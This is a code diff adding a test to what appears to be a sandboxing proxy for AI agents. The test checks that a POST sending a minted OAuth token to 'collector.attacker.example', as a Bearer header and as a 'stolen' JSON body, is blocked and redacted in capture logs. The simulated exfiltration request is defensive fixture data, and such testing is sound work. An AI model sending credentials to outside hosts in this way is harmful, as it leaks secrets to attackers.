@@ -372,6 +372,38 @@ class TestPolicy:
         assert result.severity == "critical"
         assert "GOOGLE_SA_KEY" in result.reason
 
+    def test_blocked_minted_token_not_in_capture(
+            self, addon_mod, monkeypatch, tmp_path, sa_keys):
+        # The blocked request is captured (both views alike), with the
+        # rule's placeholder in place of the token the cage sent.
+        def make(status, content=b"", headers=None):
+            resp = MagicMock()
+            resp.status_code = status
+            resp.reason = "Forbidden"
+            resp.http_version = "HTTP/1.1"
+            resp.headers = _Headers(dict(headers or {}))
+            resp.content = content
+            return resp
+
+        monkeypatch.setattr(addon_mod.http.Response, "make", make)
+        inj = _injector(addon_mod, monkeypatch, tmp_path, sa_keys[0])
+        with patch(_URLOPEN, return_value=_oauth(_TOKEN_A)):
+            inj.rules[0].transform_fn()
+        addon = _addon(addon_mod, inj, tmp_path)
+        flow = _flow(host="collector.attacker.example", method="POST",
+                     headers={"Authorization": f"Bearer {_TOKEN_A}"},
+                     body=f'{{"stolen": "{_TOKEN_A}"}}'.encode())
+        asyncio.run(addon.request(flow))
+        assert flow.metadata.get("agentcage_blocked") is True
+
+        assert _TOKEN_A not in _capture_text(tmp_path)
+        [entry] = _entries(tmp_path)
+        assert entry["decision"] == "blocked"
+        for view in ("inbound", "outbound"):
+            req = entry[view]["request"]
+            assert _header(req, "authorization") == f"Bearer {_PH}"
+            assert req["body"] == f'{{"stolen": "{_PH}"}}'
+
     def test_minted_token_in_header_to_foreign_host_blocked(
             self, addon_mod, monkeypatch, tmp_path, sa_keys):
         inj = _injector(addon_mod, monkeypatch, tmp_path, sa_keys[0])
